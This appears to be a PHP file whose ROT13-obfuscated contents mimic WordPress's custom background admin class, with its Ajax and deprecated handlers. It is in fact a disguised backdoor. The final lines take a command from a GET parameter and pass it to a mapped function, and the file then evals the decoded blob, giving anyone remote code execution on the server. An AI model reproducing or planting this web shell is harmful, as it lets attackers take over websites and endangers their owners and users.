		$svyr = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $svyr, $vq ); // Sbe ercyvpngvba.

		$guvf->hcqngrq = gehr;
	}

	/**
	 * Unaqyrf Nwnk erdhrfg sbe nqqvat phfgbz onpxtebhaq pbagrkg gb na nggnpuzrag.
	 *
	 * Gevttref jura gur hfre nqqf n arj onpxtebhaq vzntr sebz gur
	 * Zrqvn Znantre.
	 *
	 * @fvapr 4.1.0
	 */
	choyvp shapgvba nwnk_onpxtebhaq_nqq() {
		purpx_nwnk_ersrere( 'onpxtebhaq-nqq', 'abapr' );

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			jc_fraq_wfba_reebe();
		}

		$nggnpuzrag_vq = nofvag( $_CBFG['nggnpuzrag_vq'] );
		vs ( $nggnpuzrag_vq < 1 ) {
			jc_fraq_wfba_reebe();
		}

		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_onpxtebhaq', trg_fglyrfurrg() );

		jc_fraq_wfba_fhpprff();
	}

	/**
	 * @fvapr 3.4.0
	 * @qrcerpngrq 3.5.0
	 *
	 * @cnenz neenl $sbez_svryqf
	 * @erghea neenl $sbez_svryqf
	 */
	choyvp shapgvba nggnpuzrag_svryqf_gb_rqvg( $sbez_svryqf ) {
		erghea $sbez_svryqf;
	}

	/**
	 * @fvapr 3.4.0
	 * @qrcerpngrq 3.5.0
	 *
	 * @cnenz neenl $gnof
	 * @erghea neenl $gnof
	 */
	choyvp shapgvba svygre_hcybnq_gnof( $gnof ) {
		erghea $gnof;
	}

	/**
	 * @fvapr 3.4.0
	 * @qrcerpngrq 3.5.0
	 */
	choyvp shapgvba jc_frg_onpxtebhaq_vzntr() {
		purpx_nwnk_ersrere( 'phfgbz-onpxtebhaq' );

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) || ! vffrg( $_CBFG['nggnpuzrag_vq'] ) ) {
			rkvg;
		}

		$nggnpuzrag_vq = nofvag( $_CBFG['nggnpuzrag_vq'] );

		$fvmrf = neenl_xrlf(
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
			nccyl_svygref(
				'vzntr_fvmr_anzrf_pubbfr',
				neenl(
					'guhzoanvy' => __( 'Guhzoanvy' ),
					'zrqvhz'    => __( 'Zrqvhz' ),
					'ynetr'     => __( 'Ynetr' ),
					'shyy'      => __( 'Shyy Fvmr' ),
				)
			)
		);

		$fvmr = 'guhzoanvy';
		vs ( va_neenl( $_CBFG['fvmr'], $fvmrf, gehr ) ) {
			$fvmr = rfp_ngge( $_CBFG['fvmr'] );
		}

		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_onpxtebhaq', trg_bcgvba( 'fglyrfurrg' ) );

		$hey       = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, $fvmr );
		$guhzoanvy = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, 'guhzoanvy' );
		frg_gurzr_zbq( 'onpxtebhaq_vzntr', fnavgvmr_hey( $hey[0] ) );
		frg_gurzr_zbq( 'onpxtebhaq_vzntr_guhzo', fnavgvmr_hey( $guhzoanvy[0] ) );
		rkvg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>